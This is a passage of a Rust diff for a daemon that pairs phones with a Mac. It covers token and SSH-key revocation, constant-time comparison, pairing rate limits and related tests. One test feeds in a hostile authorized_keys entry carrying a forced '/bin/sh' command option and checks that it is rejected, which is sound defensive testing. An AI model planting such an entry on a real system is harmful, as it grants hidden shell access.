+    /// `authorized_keys` that could not be rewritten — a permissions problem, a
+    /// full disk, an immutable file — aborted the function *before the token was
+    /// revoked*. The operator saw an error and the phone kept its credential and
+    /// its live connections. Revoking the token is therefore done first and its
+    /// failure is fatal; removing the key is best-effort afterwards and is
+    /// *reported* rather than allowed to undo the revocation. The two grants are
+    /// independent, and failing to withdraw one is no reason to leave the other
+    /// in place.
+    pub async fn revoke(&self, needle: &str, ssh_only: bool) -> Result<RevokeOutcome> {
+        let device = match self.db.find_device(needle.to_string()).await? {
+            DeviceLookup::Found(device) => *device,
+            DeviceLookup::NotFound => {
+                anyhow::bail!("no device matches {needle:?}; `cc devices` lists them")
+            }
+            DeviceLookup::Ambiguous(ids) => anyhow::bail!(
+                "{needle:?} matches {} devices ({}); name one exactly",
+                ids.len(),
+                ids.join(", ")
+            ),
+        };
+
+        let token_revoked = if ssh_only {
+            false
+        } else {
+            let revoked = self
+                .db
+                .revoke_device(device.device_id.clone(), protocol::time::now_rfc3339())
+                .await?;
+            // Published before the SSH work, and before the re-read: the point
+            // of revocation is that it takes effect *now*, and a socket that is
+            // idle would otherwise keep serving the event log until its next
+            // keepalive. `send` fails only when nobody is subscribed, which is
+            // the ordinary case for a Mac with no phone connected.
+            let _ = self.revocations_tx.send(device.device_id.clone());
+            revoked
+        };
+
+        let ssh_key_removed = match crate::ssh_keys::remove(&device.device_id) {
+            Ok(removed) => {
+                if removed {
+                    if let Err(err) = self
+                        .db
+                        .set_ssh_installed(device.device_id.clone(), false, None)
+                        .await
+                    {
+                        crate::log_error!(
+                            "removed {}'s SSH key but could not record it: {err:#}",
+                            device.device_id
+                        );
+                    }
+                }
+                removed
+            }
+            // `ssh_only` withdrew nothing else, so its failure *is* the
+            // operation's failure and saying otherwise would report a
+            // revocation that did not happen.
+            Err(err) if ssh_only => return Err(err),
+            Err(err) => {
+                // Loud, and specific about what is still granted. The token is
+                // already gone; what survives is shell access, and the operator
+                // needs to know to go and take it away by hand.
+                crate::log_error!(
+                    "REVOCATION INCOMPLETE: {}'s token is revoked but its SSH key could not be \
+                     removed ({err:#}); delete the `# codeconnect:{}` line from \
+                     ~/.ssh/authorized_keys by hand",
+                    device.device_id,
+                    device.device_id
+                );
+                false
+            }
+        };
+
+        // Re-read so the reported state is what is now stored, not what we
+        // believe we just wrote.
+        let fresh = match self.db.find_device(device.device_id.clone()).await? {
+            DeviceLookup::Found(row) => *row,
+            _ => device,
+        };
+        let mut summary = fresh.to_summary();
+        summary.ssh_key_installed = crate::ssh_keys::is_installed(&summary.device_id);
+        crate::log_info!(
+            "revoked device {} (token_revoked={token_revoked} ssh_key_removed={ssh_key_removed})",
+            summary.device_id
+        );
+        Ok(RevokeOutcome {
+            device: summary,
+            token_revoked,
+            ssh_key_removed,
+        })
+    }
+}
+
+/// Mark the approval a tool result belongs to, if any.
+///
+/// PostToolUse carries the `tool_use_id` that *is* the approval's request id
+/// (the correlation established at PreToolUse), so this is an exact join rather
+/// than a heuristic. The resolution itself is left to the sweeper: doing it here
+/// would mean re-entering `ingest` from inside `ingest`.
+fn note_tool_result(inner: &mut Inner, event: &Event) {
+    if event.kind != EventKind::ToolResult {
+        return;
+    }
+    let Some(item_id) = &event.item_id else {
+        return;
+    };
+    let id: ApprovalId = (event.session_uid.clone(), item_id.clone());
+    if let Some(entry) = inner.pending.get_mut(&id) {
+        entry.tool_ran = true;
+    }
+}
+
+/// The launchd job this process belongs to, or `None` if it has none.
+///
+/// macOS sets `XPC_SERVICE_NAME` for every process, not only for launchd jobs:
+/// a program started from a shell inherits the literal string `"0"`, which is
+/// the documented "this is not an XPC service" sentinel. Reporting that as a
+/// label would make `cc daemon status` say a hand-started daemon is "managed by
+/// a different job (0)" — a sentence that sends the operator looking for a
+/// job that does not exist.
+///
+/// "Managed by a different job" is still a distinct outcome worth reporting, so
+/// a real label that is not ours is passed through untouched.
+pub(crate) fn launchd_label() -> Option<String> {
+    std::env::var("XPC_SERVICE_NAME")
+        .ok()
+        .filter(|label| !label.is_empty() && label != "0")
+}
+
+/// Compare without an early exit, so a wrong token cannot be discovered a byte
+/// at a time by timing the reply.
+pub(crate) fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
+    if a.len() != b.len() {
+        return false;
+    }
+    let mut diff = 0u8;
+    for (x, y) in a.iter().zip(b.iter()) {
+        diff |= x ^ y;
+    }
+    diff == 0
+}
+
+/// PermissionRequest has no `tool_use_id`; this is the join key back to the
+/// PreToolUse that does.
+///
+/// Scoped by `session_uid`, not by name: two runs called `cc-1` executing the
+/// same command in the same directory produce identical `(tool, input)` hashes,
+/// and correlating across them would hand one run's approval the other's
+/// `tool_use_id`.
+pub(crate) fn correlation_key(session_uid: &str, input: &HookInput) -> Option<String> {
+    let tool_name = input.tool_name.as_deref()?;
+    let tool_input = input.tool_input.as_ref()?;
+    Some(format!(
+        "{session_uid}|{}|{tool_name}|{}",
+        input.prompt_id.as_deref().unwrap_or(""),
+        approval_payload_hash(tool_name, tool_input)
+    ))
+}
+
+pub(crate) fn hook_event(
+    session: &SessionKey,
+    event_name: &HookEventName,
+    payload: &serde_json::Value,
+    input: &HookInput,
+) -> PendingEvent {
+    let mut pending = PendingEvent::new(
+        session,
+        event_name.maps_to_event_kind(),
+        payload.clone(),
+        Source::Hook,
+    )
+    .with_turn_id(input.prompt_id.clone())
+    .with_item_id(input.tool_use_id.clone());
+
+    // Only facts with a genuinely unique natural id get one: reusing a
+    // non-unique id would silently drop real events.
+    if let Some(tool_use_id) = &input.tool_use_id {
+        let prefix = match event_name {
+            HookEventName::PreToolUse => "pre",
+            HookEventName::PostToolUse => "post",
+            _ => "tool",
+        };
+        pending = pending.with_source_event_id(format!("{prefix}:{tool_use_id}"));
+    }
+    pending
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use serde_json::json;
+
+    fn input_from(raw: &str) -> HookInput {
+        serde_json::from_str(raw).unwrap()
+    }
+
+    // ---------------------------------------------------- daemon harness
+
+    /// A daemon with a private database and no supervisors. Everything the
+    /// tests below exercise (pairing, auth, risk, resolution bookkeeping) runs
+    /// without a tmux session, which is exactly the point: these are the paths
+    /// that must not depend on one.
+    fn test_daemon() -> Arc<Daemon> {
+        daemon_with(Config::default())
+    }
+
+    fn daemon_with(config: Config) -> Arc<Daemon> {
+        daemon_on(shared_store(), config)
+    }
+
+    /// A store two daemons can share, so a test can express "ccd was killed and
+    /// came back" as literally that rather than as a mock of it.
+    fn shared_store() -> Arc<Store> {
+        static COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
+        let path = std::env::temp_dir().join(format!(
+            "ccd-state-{}-{}-{}.db",
+            std::process::id(),
+            COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed),
+            protocol::time::now_unix_ms()
+        ));
+        let _ = std::fs::remove_file(&path);
+        Arc::new(Store::open(&path).unwrap())
+    }
+
+    fn daemon_on(store: Arc<Store>, config: Config) -> Arc<Daemon> {
+        let (tx, rx) = mpsc::unbounded_channel();
+        // Kept alive: dropping the receiver would make every transcript
+        // registration fail, which is not what any of these tests is about.
+        Box::leak(Box::new(rx));
+        Daemon::new(
+            config,
+            store,
+            Arc::new(crate::apns::LoggingPushSender::new()),
+            Endpoint {
+                host: "test.ts.net".into(),
+                port: 8787,
+                tls: false,
+            },
+            tx,
+        )
+    }
+
+    const STATIC_TOKEN: &str = "static-token-for-tests";
+
+    /// The run every hook in these tests belongs to. Fixed rather than minted so
+    /// a failure message names the same identity every time.
+    const TEST_UID: &str = "01K1B3XQ8ZC0DE5FGH7JKMNPQR";
+
+    fn test_key() -> SessionKey {
+        assert!(protocol::uid::is_well_formed(TEST_UID));
+        SessionKey::new(TEST_UID, "cc-1")
+    }
+
+    async fn hello_with_code(daemon: &Arc<Daemon>, code: &str) -> AuthOutcome {
+        daemon
+            .authenticate(STATIC_TOKEN, None, Some(code), None, Some("iPhone"))
+            .await
+    }
+
+    // ------------------------------------------------------------ pairing
+
+    #[tokio::test]
+    async fn a_pairing_code_buys_exactly_one_device_token() {
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, false).await.unwrap();
+
+        let token = match hello_with_code(&daemon, &code).await {
+            AuthOutcome::Paired {
+                token,
+                device_name,
+                ssh_key_installed,
+                ..
+            } => {
+                assert_eq!(device_name, "iPhone");
+                assert!(!ssh_key_installed, "no key was offered");
+                assert_eq!(token.len(), 64);
+                token
+            }
+            other => panic!("pairing must succeed: {other:?}"),
+        };
+
+        // The minted token authenticates on its own from now on.
+        match daemon
+            .authenticate(STATIC_TOKEN, Some(&token), None, None, None)
+            .await
+        {
+            AuthOutcome::Device(device) => assert_eq!(device.name, "iPhone"),
+            other => panic!("the device token must authenticate: {other:?}"),
+        }
+
+        // And the code is spent: a second phone scanning the same screen fails.
+        assert!(matches!(
+            hello_with_code(&daemon, &code).await,
+            AuthOutcome::Rejected(_)
+        ));
+    }
+
+    #[tokio::test]
+    async fn codes_are_normalised_the_way_a_human_would_type_them() {
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, false).await.unwrap();
+        let typed = format!(
+            "  {}  ",
+            protocol::pairing::format_for_display(&code).to_lowercase()
+        );
+        assert!(matches!(
+            hello_with_code(&daemon, &typed).await,
+            AuthOutcome::Paired { .. }
+        ));
+    }
+
+    #[tokio::test]
+    async fn a_wrong_or_malformed_code_pairs_nothing() {
+        let daemon = test_daemon();
+        for attempt in ["", "nope", "ABCD2345", "AAAAAAAA", "0000000O"] {
+            assert!(
+                matches!(
+                    hello_with_code(&daemon, attempt).await,
+                    AuthOutcome::Rejected(_)
+                ),
+                "{attempt:?} must not pair"
+            );
+        }
+        assert!(daemon.list_devices().await.unwrap().is_empty());
+    }
+
+    #[tokio::test]
+    async fn an_expired_code_pairs_nothing() {
+        let daemon = test_daemon();
+        // A TTL already in the past: the code exists but can never be redeemed.
+        let (code, _) = daemon.create_pairing(0, false).await.unwrap();
+        tokio::time::sleep(Duration::from_millis(5)).await;
+        assert!(matches!(
+            hello_with_code(&daemon, &code).await,
+            AuthOutcome::Rejected(_)
+        ));
+    }
+
+    #[tokio::test]
+    async fn a_hello_with_no_credential_at_all_is_refused() {
+        let daemon = test_daemon();
+        assert!(matches!(
+            daemon
+                .authenticate(STATIC_TOKEN, None, None, None, None)
+                .await,
+            AuthOutcome::Rejected(_)
+        ));
+        assert!(matches!(
+            daemon
+                .authenticate(STATIC_TOKEN, Some(""), None, None, None)
+                .await,
+            AuthOutcome::Rejected(_)
+        ));
+    }
+
+    #[tokio::test]
+    async fn the_static_token_keeps_working_alongside_device_tokens() {
+        // The upgrade guarantee: a phone paired before device tokens existed
+        // must not be locked out because the Mac learned how to mint them.
+        let daemon = test_daemon();
+        assert!(matches!(
+            daemon
+                .authenticate(STATIC_TOKEN, Some(STATIC_TOKEN), None, None, None)
+                .await,
+            AuthOutcome::Static
+        ));
+        assert!(matches!(
+            daemon
+                .authenticate(STATIC_TOKEN, Some("not-the-token"), None, None, None)
+                .await,
+            AuthOutcome::Rejected(_)
+        ));
+    }
+
+    #[tokio::test]
+    async fn a_token_wins_over_a_pairing_code_and_leaves_it_unspent() {
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, false).await.unwrap();
+        // Re-pairing an already-paired phone would strand its first credential.
+        assert!(matches!(
+            daemon
+                .authenticate(STATIC_TOKEN, Some(STATIC_TOKEN), Some(&code), None, None)
+                .await,
+            AuthOutcome::Static
+        ));
+        assert!(
+            matches!(
+                hello_with_code(&daemon, &code).await,
+                AuthOutcome::Paired { .. }
+            ),
+            "the unused code must still be redeemable"
+        );
+    }
+
+    #[tokio::test]
+    async fn revoking_a_device_stops_its_token_working() {
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, false).await.unwrap();
+        let AuthOutcome::Paired {
+            token, device_id, ..
+        } = hello_with_code(&daemon, &code).await
+        else {
+            panic!("pairing must succeed");
+        };
+
+        let outcome = daemon.revoke(&device_id, false).await.unwrap();
+        assert!(outcome.token_revoked);
+        assert!(!outcome.ssh_key_removed);
+        assert!(matches!(
+            daemon
+                .authenticate(STATIC_TOKEN, Some(&token), None, None, None)
+                .await,
+            AuthOutcome::Rejected(_)
+        ));
+        // Still listed, so "revoked on the 3rd" survives as a fact.
+        let devices = daemon.list_devices().await.unwrap();
+        assert_eq!(devices.len(), 1);
+        assert!(!devices[0].is_active());
+    }
+
+    #[tokio::test]
+    async fn revocation_is_visible_to_an_already_open_connection() {
+        // A phone holds its socket open for hours, so a check that only runs at
+        // `hello` would let a revoked device keep answering approvals and typing
+        // into the session's TTY until the socket happened to drop. The ws loop
+        // re-reads this on every message and on the keepalive tick.
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, false).await.unwrap();
+        let AuthOutcome::Paired { device_id, .. } = hello_with_code(&daemon, &code).await else {
+            panic!("pairing must succeed");
+        };
+        assert!(daemon.store.device_is_active(&device_id).unwrap());
+
+        daemon.revoke(&device_id, false).await.unwrap();
+        assert!(
+            !daemon.store.device_is_active(&device_id).unwrap(),
+            "a live connection must be able to notice the revocation"
+        );
+        // An id that was never issued is not "active" either.
+        assert!(!daemon.store.device_is_active("never-existed").unwrap());
+    }
+
+    #[tokio::test]
+    async fn an_ssh_only_revoke_leaves_the_connection_alive() {
+        // The narrower tool must not also cut the phone off; `cc revoke` is for
+        // that, and conflating them would make dropping shell access far more
+        // disruptive than the operator asked for.
+        let home = crate::ssh_keys::test_home::FakeHome::new("state-sshonly");
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, true).await.unwrap();
+        let offered = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0JGKZ3rL5vhF2dxJ8kX9wQqM4tN6pS1aB7cD3eF5gH phone";
+        let AuthOutcome::Paired { device_id, .. } = daemon
+            .authenticate(
+                STATIC_TOKEN,
+                None,
+                Some(&code),
+                Some(offered),
+                Some("iPhone"),
+            )
+            .await
+        else {
+            panic!("pairing must succeed");
+        };
+        daemon.revoke(&device_id, true).await.unwrap();
+        assert!(
+            daemon.store.device_is_active(&device_id).unwrap(),
+            "ssh-revoke must not disconnect the device"
+        );
+        assert!(!home.read().contains("codeconnect:"));
+    }
+
+    #[tokio::test]
+    async fn revoking_something_that_does_not_exist_says_so() {
+        let daemon = test_daemon();
+        let err = daemon.revoke("ghost", false).await.unwrap_err().to_string();
+        assert!(err.contains("no device matches"), "{err}");
+    }
+
+    // ------------------------------------------------------------ ssh gate
+
+    #[tokio::test]
+    async fn a_key_offered_without_cc_pair_ssh_is_never_installed() {
+        // The single most important assertion in this file. A code minted
+        // without `--ssh` must leave ~/.ssh untouched no matter what the peer
+        // sends, so the test runs against a redirected HOME and then asserts
+        // that nothing whatsoever was created there.
+        let home = crate::ssh_keys::test_home::FakeHome::new("state-consent");
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, false).await.unwrap();
+
+        let offered = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0JGKZ3rL5vhF2dxJ8kX9wQqM4tN6pS1aB7cD3eF5gH phone";
+        let outcome = daemon
+            .authenticate(
+                STATIC_TOKEN,
+                None,
+                Some(&code),
+                Some(offered),
+                Some("iPhone"),
+            )
+            .await;
+        match outcome {
+            AuthOutcome::Paired {
+                ssh_key_installed, ..
+            } => {
+                assert!(!ssh_key_installed, "consent was never given");
+            }
+            other => panic!("pairing itself must still succeed: {other:?}"),
+        }
+        assert_eq!(
+            home.read(),
+            "",
+            "authorized_keys must not exist or have content"
+        );
+        assert!(
+            !home.dir.join(".ssh").exists(),
+            "~/.ssh must not be created"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_consented_key_is_installed_and_revocable() {
+        let home = crate::ssh_keys::test_home::FakeHome::new("state-consented");
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, true).await.unwrap();
+
+        let offered = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0JGKZ3rL5vhF2dxJ8kX9wQqM4tN6pS1aB7cD3eF5gH phone";
+        let AuthOutcome::Paired {
+            device_id,
+            ssh_key_installed,
+            ..
+        } = daemon
+            .authenticate(
+                STATIC_TOKEN,
+                None,
+                Some(&code),
+                Some(offered),
+                Some("iPhone"),
+            )
+            .await
+        else {
+            panic!("pairing must succeed");
+        };
+        assert!(ssh_key_installed);
+        assert!(home.read().contains(&format!("codeconnect:{device_id}")));
+
+        let devices = daemon.list_devices().await.unwrap();
+        assert!(devices[0].ssh_key_installed);
+        assert!(devices[0]
+            .ssh_fingerprint
+            .as_deref()
+            .unwrap()
+            .starts_with("SHA256:"));
+
+        // `ssh-revoke` takes the key and leaves the pairing.
+        let outcome = daemon.revoke(&device_id, true).await.unwrap();
+        assert!(outcome.ssh_key_removed);
+        assert!(!outcome.token_revoked);
+        assert!(outcome.device.is_active(), "the device stays paired");
+        assert!(!home.read().contains("codeconnect:"), "{}", home.read());
+    }
+
+    #[tokio::test]
+    async fn pairing_attempts_are_capped_inside_the_window() {
+        // A pairing code has real entropy and lives five minutes, so this is
+        // not what stops a guess — it is what stops an *unbounded number* of
+        // guesses. The safety argument for a short-lived code is "you cannot
+        // try enough of them in five minutes", and that is only true if
+        // something is counting. Nothing was.
+        let daemon = daemon_with(Config {
+            pairing_max_attempts: 3,
+            pairing_window_secs: 300,
+            ..Config::default()
+        });
+        for attempt in 0..3 {
+            let outcome = hello_with_code(&daemon, "AAAA-BBBB").await;
+            assert!(
+                matches!(outcome, AuthOutcome::Rejected(ref why) if why.contains("unknown")),
+                "attempt {attempt} should have been an ordinary rejection: {outcome:?}"
+            );
+        }
+        // The fourth is refused before the store is consulted at all.
+        match hello_with_code(&daemon, "AAAA-BBBB").await {
+            AuthOutcome::Rejected(why) => assert!(
+                why.contains("too many"),
+                "the limiter must be what refuses this one: {why}"
+            ),
+            other => panic!("a fourth attempt must be refused: {other:?}"),
+        }
+
+        // And a *real* code is refused too, which is the point: the window has
+        // to close for everybody or it closes for nobody.
+        let (code, _) = daemon.create_pairing(300, false).await.unwrap();
+        assert!(matches!(
+            hello_with_code(&daemon, &code).await,
+            AuthOutcome::Rejected(_)
+        ));
+    }
+
+    #[tokio::test]
+    async fn a_successful_pairing_does_not_count_against_the_limit() {
+        // A phone pairing normally must never push the daemon towards its own
+        // limit, or a household with several devices would lock itself out.
+        let daemon = daemon_with(Config {
+            pairing_max_attempts: 2,
+            pairing_window_secs: 300,
+            ..Config::default()
+        });
+        for _ in 0..5 {
+            let (code, _) = daemon.create_pairing(300, false).await.unwrap();
+            assert!(matches!(
+                hello_with_code(&daemon, &code).await,
+                AuthOutcome::Paired { .. }
+            ));
+        }
+    }
+
+    #[tokio::test]
+    async fn the_window_reopens_once_the_failures_age_out() {
+        let daemon = daemon_with(Config {
+            pairing_max_attempts: 2,
+            // One second, so the test measures the sliding window rather than
+            // waiting out a production-sized one.
+            pairing_window_secs: 1,
+            ..Config::default()
+        });
+        for _ in 0..2 {
+            assert!(matches!(
+                hello_with_code(&daemon, "AAAA-BBBB").await,
+                AuthOutcome::Rejected(_)
+            ));
+        }
+        assert!(
+            !daemon
+                .admit_pairing_attempt(protocol::time::now_unix_ms())
+                .await
+        );
+        // Far enough past the window that the two recorded failures fall out.
+        let later = protocol::time::now_unix_ms() + 1_500;
+        assert!(
+            daemon.admit_pairing_attempt(later).await,
+            "a sliding window that never reopens is a lockout, not a rate limit"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_zero_limit_disables_the_limiter() {
+        let daemon = daemon_with(Config {
+            pairing_max_attempts: 0,
+            ..Config::default()
+        });
+        for _ in 0..50 {
+            assert!(matches!(
+                hello_with_code(&daemon, "AAAA-BBBB").await,
+                AuthOutcome::Rejected(ref why) if why.contains("unknown")
+            ));
+        }
+    }
+
+    #[tokio::test]
+    async fn an_unwritable_authorized_keys_no_longer_blocks_the_revocation() {
+        // The defect, in order: the old `revoke` removed the SSH key first and
+        // used `?` on the result, so an `authorized_keys` that could not be
+        // rewritten — read-only directory, full disk, immutable file — returned
+        // an error *before the token was ever revoked*. The operator saw a
+        // failure, and the phone kept a working credential. The two grants are
+        // independent: failing to withdraw one is no reason to leave the other.
+        use std::os::unix::fs::PermissionsExt;
+        let home = crate::ssh_keys::test_home::FakeHome::new("state-revoke-locked");
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, true).await.unwrap();
+        let offered = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0JGKZ3rL5vhF2dxJ8kX9wQqM4tN6pS1aB7cD3eF5gH phone";
+        let AuthOutcome::Paired { device_id, .. } = daemon
+            .authenticate(
+                STATIC_TOKEN,
+                None,
+                Some(&code),
+                Some(offered),
+                Some("iPhone"),
+            )
+            .await
+        else {
+            panic!("pairing must succeed");
+        };
+        assert!(home.read().contains(&format!("codeconnect:{device_id}")));
+
+        // A directory the daemon cannot write into: the atomic replace needs to
+        // create a sibling temporary, and that is what now fails.
+        let ssh_dir = home.dir.join(".ssh");
+        std::fs::set_permissions(&ssh_dir, std::fs::Permissions::from_mode(0o500)).unwrap();
+        let outcome = daemon.revoke(&device_id, false).await;
+        // Restored before any assertion, so a failure here still leaves a
+        // removable temp directory behind.
+        std::fs::set_permissions(&ssh_dir, std::fs::Permissions::from_mode(0o700)).unwrap();
+
+        let outcome = outcome.expect("a key-file failure must not fail the revocation");
+        assert!(
+            outcome.token_revoked,
+            "the token must be revoked even when the key could not be removed"
+        );
+        assert!(
+            !outcome.ssh_key_removed,
+            "and the daemon must say plainly that the key is still there"
+        );
+        assert!(
+            !outcome.device.is_active(),
+            "the device must be reported as revoked"
+        );
+        assert!(
+            !daemon.store.device_is_active(&device_id).unwrap(),
+            "and the store must agree, which is what every later auth reads"
+        );
+        // The key really is still installed — the report was honest.
+        assert!(home.read().contains(&format!("codeconnect:{device_id}")));
+    }
+
+    #[tokio::test]
+    async fn an_ssh_only_revoke_still_reports_a_key_it_could_not_remove() {
+        // The mirror image. `cc ssh-revoke` withdraws nothing *but* the key, so
+        // a failure to remove it is the whole operation failing, and swallowing
+        // it would report a revocation that did not happen.
+        use std::os::unix::fs::PermissionsExt;
+        let home = crate::ssh_keys::test_home::FakeHome::new("state-sshonly-locked");
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, true).await.unwrap();
+        let offered = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0JGKZ3rL5vhF2dxJ8kX9wQqM4tN6pS1aB7cD3eF5gH phone";
+        let AuthOutcome::Paired { device_id, .. } = daemon
+            .authenticate(
+                STATIC_TOKEN,
+                None,
+                Some(&code),
+                Some(offered),
+                Some("iPhone"),
+            )
+            .await
+        else {
+            panic!("pairing must succeed");
+        };
+
+        let ssh_dir = home.dir.join(".ssh");
+        std::fs::set_permissions(&ssh_dir, std::fs::Permissions::from_mode(0o500)).unwrap();
+        let outcome = daemon.revoke(&device_id, true).await;
+        std::fs::set_permissions(&ssh_dir, std::fs::Permissions::from_mode(0o700)).unwrap();
+
+        assert!(
+            outcome.is_err(),
+            "ssh-revoke must report a key it could not remove"
+        );
+        assert!(
+            daemon.store.device_is_active(&device_id).unwrap(),
+            "and it must not have revoked the token as a side effect"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_malformed_key_does_not_fail_the_pairing() {
+        // Pairing is what the user asked for; the key is a bonus. Refusing the
+        // key and reporting it beats refusing the pairing.
+        let home = crate::ssh_keys::test_home::FakeHome::new("state-badkey");
+        let daemon = test_daemon();
+        let (code, _) = daemon.create_pairing(300, true).await.unwrap();
+        let outcome = daemon
+            .authenticate(
+                STATIC_TOKEN,
+                None,
+                Some(&code),
+                Some("command=\"/bin/sh\" ssh-rsa AAAAB3 evil"),
+                Some("iPhone"),
+            )
+            .await;
+        match outcome {
+            AuthOutcome::Paired {
+                ssh_key_installed, ..
+            } => assert!(!ssh_key_installed),
+            other => panic!("pairing must still succeed: {other:?}"),
+        }
+        assert_eq!(home.read(), "");
+    }
+
+    // --------------------------------------------------- session identity
+
+    /// Register a supervisor the way the ipc server does, minus the socket.
+    async fn register(daemon: &Arc<Daemon>, name: &str, uid: Option<&str>) -> Registration {
+        register_speaking(daemon, name, uid, protocol::PROTOCOL_MINOR).await
+    }
+
+    /// The same, at a chosen feature level — a supervisor left behind by an
+    /// in-place upgrade reports the minor it was built with.
+    async fn register_speaking(
+        daemon: &Arc<Daemon>,
+        name: &str,
+        uid: Option<&str>,
+        protocol_minor: u32,
+    ) -> Registration {
+        // Bounded exactly as the ipc server's is, so a test cannot pass on a
+        // queue depth the daemon never has.
+        let (tx, rx) = mpsc::channel(protocol::config::Config::default().ipc_write_queue);
+        // Kept alive so the handle looks attached; nothing here sends to it.
+        Box::leak(Box::new(rx));
+        daemon
+            .register_supervisor(
+                RegisterSession {
+                    session_id: name.to_string(),
+                    session_uid: uid.map(str::to_string),
+                    tmux_session: name.to_string(),
+                    tmux_socket: protocol::TMUX_SOCKET_NAME.to_string(),
+                    cwd: "/tmp".to_string(),
+                    supervisor_pid: 4242,
+                    claude_bin: None,
+                    started_at: protocol::time::now_rfc3339(),
+                    protocol_minor,
+                },
+                tx,
+                Arc::new(std::sync::Mutex::new(HashMap::new())),
+            )
+            .await
+            .expect("registration must succeed")
+    }
+
+    // ------------------------------------------------------ fake supervisor
+
+    /// Verbatim shape of a live permission prompt on claude 2.1.220. Only the
+    /// command differs between the two.
+    fn permission_pane(command: &str) -> String {
+        format!(
+            " Bash command\n   {command}\n   Run this command\n\n Do you want to proceed?\n \
+             ❯ 1. Yes\n   2. Yes, and always allow\n   3. No\n \
+             Esc to cancel · Tab to amend · ctrl+e to explain"
+        )
+    }
+
+    const COMPOSER_PANE: &str = "\
+❯
+────────────────────────────────────────
+  ⏸ manual mode on · ? for shortcuts · ← for agents                    ● high · /effort";
+
+    /// A supervisor that actually answers, over a screen the test controls.
+    ///
+    /// It makes its decisions with the same `protocol::ipc` functions the real
+    /// supervisor calls — presence needle, then prompt fingerprint — because a
+    /// harness that re-implements the interlock would be testing its own copy of
+    /// it. What it adds is a *split screen*: `scrollback` is only ever returned
+    /// for a capture that did not ask for the visible pane, which is how these
+    /// tests can tell "read the screen" from "read the history".
+    struct FakeSupervisor {
+        visible: Arc<std::sync::Mutex<String>>,
+        typed: Arc<std::sync::Mutex<Vec<String>>>,
+        captures: Arc<std::sync::Mutex<Vec<bool>>>,
+        /// When set, injections are swallowed without a reply — a supervisor
+        /// that typed and then stopped answering, which is indistinguishable
+        /// from one that never typed at all.
+        silent: Arc<std::sync::atomic::AtomicBool>,
+        /// The very map `supervisor_request` inserts into, so a test can assert
+        /// that a request which was never answered left nothing behind.
+        inflight: Arc<std::sync::Mutex<HashMap<String, oneshot::Sender<SupervisorResult>>>>,
+        /// Held so the daemon keeps seeing this supervisor as attached for as
+        /// long as the test holds the handle.
+        _registration: Registration,
+    }
+
+    impl FakeSupervisor {
+        fn show(&self, pane: &str) {
+            *self.visible.lock().unwrap() = pane.to_string();
+        }
+
+        /// How many requests this supervisor still has outstanding.
+        fn inflight_len(&self) -> usize {
+            self.inflight.lock().unwrap().len()
+        }
+
+        /// Stop answering injections. Nothing here records whether it typed,
+        /// because the daemon cannot know either — that is the whole point.
+        fn go_silent(&self) {
+            self.silent.store(true, std::sync::atomic::Ordering::SeqCst);
+        }
+
+        fn typed(&self) -> Vec<String> {
+            self.typed.lock().unwrap().clone()
+        }
+
+        /// `visible_only` for every capture the daemon asked for, in order.
+        fn captures(&self) -> Vec<bool> {
+            self.captures.lock().unwrap().clone()
+        }
+    }
+
+    async fn attach(
+        daemon: &Arc<Daemon>,
+        name: &str,
+        uid: &str,
+        visible: &str,
+        scrollback: &str,
+    ) -> FakeSupervisor {
+        attach_speaking(
+            daemon,
+            name,
+            uid,
+            visible,
+            scrollback,
+            protocol::PROTOCOL_MINOR,
+        )
+        .await
+    }
+
+    async fn attach_speaking(
+        daemon: &Arc<Daemon>,
+        name: &str,
+        uid: &str,
+        visible: &str,
+        scrollback: &str,
+        protocol_minor: u32,
+    ) -> FakeSupervisor {
+        let (tx, mut rx) =
+            mpsc::channel::<DaemonFrame>(protocol::config::Config::default().ipc_write_queue);
+        let inflight: Arc<std::sync::Mutex<HashMap<String, oneshot::Sender<SupervisorResult>>>> =
+            Arc::new(std::sync::Mutex::new(HashMap::new()));
+        let visible_cell = Arc::new(std::sync::Mutex::new(visible.to_string()));
+        let typed = Arc::new(std::sync::Mutex::new(Vec::new()));
+        let captures = Arc::new(std::sync::Mutex::new(Vec::new()));
+        let silent = Arc::new(std::sync::atomic::AtomicBool::new(false));
+        let history = scrollback.to_string();
+
+        {
+            let inflight = Arc::clone(&inflight);
+            let visible_cell = Arc::clone(&visible_cell);
+            let typed = Arc::clone(&typed);
+            let captures = Arc::clone(&captures);
+            let silent = Arc::clone(&silent);
+            tokio::spawn(async move {
+                while let Some(frame) = rx.recv().await {
+                    let DaemonFrame::SupervisorRequest { id, request } = frame else {
+                        continue;
+                    };
+                    let on_screen = visible_cell.lock().unwrap().clone();
+                    let result = match request {
+                        SupervisorRequest::Ping => SupervisorResult::Pong,
+                        SupervisorRequest::Capture { visible_only, .. } => {
+                            captures.lock().unwrap().push(visible_only);
+                            SupervisorResult::Snapshot {
+                                text: if visible_only {
+                                    on_screen
+                                } else {
+                                    format!("{history}\n{on_screen}")
+                                },
+                            }
+                        }
+                        SupervisorRequest::SendText {
+                            text,
+                            require,
+                            expect,
+                            ..
+                        } if silent.load(std::sync::atomic::Ordering::SeqCst) => {
+                            let _ = (text, require, expect);
+                            continue;
+                        }
+                        SupervisorRequest::SendText {
+                            text,
+                            require,
+                            expect,
+                            ..
